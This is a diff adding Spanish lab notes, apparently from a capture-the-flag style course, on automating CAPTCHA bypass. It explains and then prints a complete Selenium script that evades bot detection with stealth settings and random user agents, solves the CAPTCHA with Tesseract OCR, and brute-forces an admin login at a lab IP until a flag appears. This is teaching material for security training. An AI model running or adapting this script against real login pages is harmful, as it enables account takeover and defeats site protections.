@@ -3,3 +3,268 @@ layout: apunte
 title: "3. Automating CAPTCHA Bypass"
 ---
 
+CAPTCHAS, o Completely Automated Public Turing Tests to Tell Computers and Humans Apart, son mecanismos de seguridad diseñados para prevenir que bots automatizados accedan a la aplicación web. Presentando un reto que es fácil para los humanos pero difícil para las máquinas, mitigan efectivamente los ataques de fuerza bruta. Sin embargo, los atacantes suelen intentar bypassear los CAPTCHAs usando herramientas de automatización como Selenium o motores de Optical Character Recognition (OCR) como Tesseract.
+
+En esta tarea veremos cómo usar Selenium para automatizar la resolución de CAPTCHAs durante un ataque de fuerza bruta. El script capturará la imagen CAPTCHA, la procesará, extraerá el texto usando OCR e intentará iniciar sesión con diferentes combinaciones de contraseñas.
+
+Antes de analizar el script, debemos entender algunos conceptos esenciales relacionados con el bypasseo del CAPTCHA en Selenium:
+
+- **CAPTCHA Identification:** Selenium captura el CAPTCHA directamente de la página web como imagen PNG usando capturas de pantalla de nivel de navegador.
+- **Image Preprocessing:** La imagen CAPTCHA es procesada usando la librería Pillow para mejorar la calidad e incrementar la precisión del resultado OCR.
+- **OCR (Optical Character Recognition):** Tesseract OCR extrae el texto de la imagen CAPTCHA. La convierte en texto legible.
+
+-----------------------------------------------
+<h2>Automatizar el Bypasseo del CAPTCHA</h2>
+La aplicación hosteada usa un sistema de CAPTCHA para prevenir intentos de inicio de sesión automatizados. El CAPTCHA consiste de 5 caracteres alfanuméricos que necesita ser resuelto antes de proceder.
+
+!**Pasted image 20260329173741.png**
+
+--------------------------------------------
+<h2>Visualización del Código</h2>
+El script de Python usa Selenium para intentar múltiples intentos de login usando una lista de contraseñas. El desglose debajo:
+
+<h3>Paso 1 - Importar Librerías</h3>
+```python
+from selenium.webdriver.common.by import By
+from selenium import webdriver
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.chrome.service import Service
+from selenium_stealth import stealth
+
+import time
+from fake_useragent import UserAgent
+from PIL import Image, ImageEnhance, ImageFilter
+import pytesseract
+import io
+import os
+```
+
+- **Selenium WebDriver:** Controla el navegador para automatizar interacciones.
+- **selenium_stealth:** Es usado para prevenir detección de bots.
+- **fake_useragent:** Genera fingerprints de navegador realistas para evitar detección.
+- **Pillow:** Es usado para el procesado y mejorado de imágenes.
+- **Tesseract:** Realiza OCR para extraer texto CAPTCHA.
+
+<h3>Paso 2 - Configurar el Navegador</h3>
+El script usa el WebDriver de Chrome con varias configuraciones para optimizar el desempeño y evadir detección:
+
+```python
+options = Options()
+ua = UserAgent()
+userAgent = ua.random
+options.add_argument('--no-sandbox')
+options.add_argument('--headless')
+options.add_argument("start-maximized")
+options.add_argument(f'user-agent={userAgent}')
+options.add_argument('--disable-dev-shm-usage')
+options.add_argument('--disable-cache')
+options.add_argument('--disable-gpu')
+```
+
+- `--no-sandbox`: Deshabilita el modo sandbox de Chrome.
+- `--headless`: Ejecuta Chrome sin interfaz gráfica de usuario.
+- `start-maximized`: Asegura que el navegador está maximizado para evitar problemas.
+- `f'user-agent={userAgent}'`: Genera un user-agent aleatorio para replicar usuarios reales.
+- `--disable-cache`: Previene de que se guarde información den la caché, afectando a los intentos de ataque.
+
+<h3>Paso 3 - Implementar Técnicas de Sigilo</h3>
+El script usa `selenium_stealth` para bypassear la detección de bots manipulando las fingerprints del navegador:
+
+```python
+stealth(chrome,
+    languages=["en-US", "en"],
+    vendor="Google Inc.",
+    platform="Win32",
+    webgl_vendor="Intel Inc.",
+    renderer="Intel Iris OpenGL Engine",
+    fix_hairline=True,
+)
+```
+
+- **Languages and Vendor:** Simula la configuración de navegador de un usuario real.
+- **WebGL Vendor and Renderer:** Enmascara los detalles de GPU para evitar detección.
+- **Fix Hairline:** Corrige el renderizado si hay problemas.
+
+---------------------------------------
+<h2>Realizar el Bypass de CAPTCHA</h3>
+El script usa Selenium para capturar el CAPTCHA, preprocesar la imagen, realizar el OCR y subir el intento de login.
+
+<h3>Paso 1 - Extracción de CAPTCHA</h3>
+La imagen CAPTCHA es identificada usando la etiqueta `<img>` y capturada usando `screenshot_as_png`:
+
+```python
+captcha_img_element = chrome.find_element(By.TAG_NAME, "img")
+captcha_png = captcha_img_element.screenshot_as_png
+```
+
+- `find_element()`: Localiza la imagen usando su etiqueta.
+- `screenshot_as_png`: Captura la imagen directamente desde el navegador.
+
+<h3>Paso 2 - Preprocesado de Imagen para OCR</h3>
+La imagen capturada es sometida a varios preprocesados usando Pillow para mejorar su claridad y legibilidad.
+
+```python
+image = Image.open(io.BytesIO(captcha_png)).convert("L")
+image = image.resize((image.width * 2, image.height * 2), Image.LANCZOS)
+image = image.filter(ImageFilter.SHARPEN)
+image = ImageEnhance.Contrast(image).enhance(2.0)
+image = image.point(lambda x: 0 if x < 140 else 255, '1')
+```
+
+- **Grayscale Conversion:** Convierte la image a blanco y negro para mejor contraste.
+- **Resizing:** Engrandece la imagen usando el algoritmo LANCZOS.
+- **Sharpening:** Mejora los extremos del texto usando un filtro de afilado.
+- **Contrast Enhancement:** Mejora la visibilidad usando ajustes de contraste.
+- **Binarization:** Elimina el ruido innecesario convirtiendo píxeles a blanco o negro.
+
+<h3>Paso 3 - Realizar OCR con Tesseract</h3>
+Tesseract OCR es usado para interpretar el CAPTCHA y extraer el texto:
+
+```python
+captcha_text = pytesseract.image_to_string(
+    image,
+    config='--psm 7 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ23456789'
+).strip().replace(" ", "").replace("\n", "").upper()
+```
+
+- `--psm 7`: El modo Tesseract para leer una sola linea.
+- `tessedit_char_whitelist`: Restringe el reconocimiento a letras y números en mayúscula.
+- `strip()`: Elimina espacios extra en blanco.
+
+<h3>Paso 4 - Subida de Formulario</h3>
+Una vez que el CAPTCHA está resuelto, el script sube el formulario usando Selenium:
+
+```python
+chrome.find_element(By.NAME, "username").send_keys(username)
+chrome.find_element(By.NAME, "password").send_keys(password)
+chrome.find_element(By.NAME, "captcha_input").send_keys(captcha_text)
+chrome.find_element(By.TAG_NAME, "form").submit()
+```
+
+- `.send_keys()`: Introduce el username, password y CAPTCHA.
+- `.submit()`: Manda el formulario para autentificarlo.
+
+<h3>Paso 5 - Validar Intentos de Login</h3>
+El script comprueba si el login fue exitoso verificando si el navegador ha navegado a la URL del dashboard.
+
+```python
+if dashboard_url in chrome.current_url:
+    print(f"[+] Login successful with password: {password}")
+else:
+    print(f"[-] Failed login with: {password}")
+```
+
+- **URL Check:** Determina éxito comparando la URL actual con la del dashboard.
+
+-------------------------------------
+<h2>Código Completo</h2>
+```python
+from selenium.webdriver.common.by import By
+from selenium import webdriver
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.chrome.service import Service
+from selenium_stealth import stealth
+
+import time
+from fake_useragent import UserAgent
+from PIL import Image, ImageEnhance, ImageFilter
+import pytesseract
+import io
+import os
+
+# Create folder for saving CAPTCHA images
+os.makedirs("captchas", exist_ok=True)
+
+options = Options()
+ua = UserAgent()
+userAgent = ua.random
+options.add_argument('--no-sandbox')
+options.add_argument('--headless')
+options.add_argument("start-maximized")
+options.add_argument(f'user-agent={userAgent}')
+options.add_argument('--disable-dev-shm-usage')
+options.add_argument('--disable-cache')
+options.add_argument('--disable-gpu')
+
+options.binary_location = "/usr/bin/google-chrome"
+service = Service(executable_path='chromedriver-linux64/chromedriver')
+chrome = webdriver.Chrome(service=service, options=options)
+
+stealth(chrome,
+    languages=["en-US", "en"],
+    vendor="Google Inc.",
+    platform="Win32",
+    webgl_vendor="Intel Inc.",
+    renderer="Intel Iris OpenGL Engine",
+    fix_hairline=True,
+)
+
+# CONFIG
+ip = 'http://10.80.191.167/labs/lab2'
+login_url = f'{ip}/index.php'
+dashboard_url = f'{ip}/dashboard.php'
+
+username = "admin"
+passwords = ["123456", "admin", "letmein", "password123", "password"]
+
+for password in passwords:
+    while True:
+        chrome.get(login_url)
+        time.sleep(1)
+
+        # Grab CSRF token
+        csrf = chrome.find_element(By.NAME, "csrf_token").get_attribute("value")
+
+        # Get CAPTCHA image rendered in-browser
+        captcha_img_element = chrome.find_element(By.TAG_NAME, "img")
+        captcha_png = captcha_img_element.screenshot_as_png
+
+        # Preprocess image for OCR
+        image = Image.open(io.BytesIO(captcha_png)).convert("L")
+        image = image.resize((image.width * 2, image.height * 2), Image.LANCZOS)  # Resize for clarity
+        image = image.filter(ImageFilter.SHARPEN)
+        image = ImageEnhance.Contrast(image).enhance(2.0)
+        image = image.point(lambda x: 0 if x < 140 else 255, '1')
+
+        # OCR the CAPTCHA
+        captcha_text = pytesseract.image_to_string(
+            image,
+            config='--psm 7 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ23456789'
+        ).strip().replace(" ", "").replace("\n", "").upper()
+
+        # Save the image for review
+        image.save(f"captchas/captcha_{password}_{captcha_text}.png")
+
+        if not captcha_text.isalnum() or len(captcha_text) != 5:
+            print(f"[!] OCR failed (got: '{captcha_text}'), retrying...")
+            continue
+
+        print(f"[*] Trying password: {password} with CAPTCHA: {captcha_text}")
+
+        # Fill out and submit the form
+        chrome.find_element(By.NAME, "username").send_keys(username)
+        chrome.find_element(By.NAME, "password").send_keys(password)
+        chrome.find_element(By.NAME, "captcha_input").send_keys(captcha_text)
+        chrome.find_element(By.TAG_NAME, "form").submit()
+
+        time.sleep(1)
+
+        print("=== HTML Output After Submit ===")
+        print(chrome.page_source)
+        print("================================")
+
+        if dashboard_url in chrome.current_url:
+            print(f"[+] Login successful with password: {password}")
+            try:
+                flag = chrome.find_element(By.TAG_NAME, "p").text
+                print(f"[+] {flag}")
+            except:
+                print("[!] Logged in, but no flag found.")
+            chrome.quit()
+            exit()
+        else:
+            print(f"[-] Failed login with: {password}")
+            break  # try next password
+
+chrome.quit()
+```
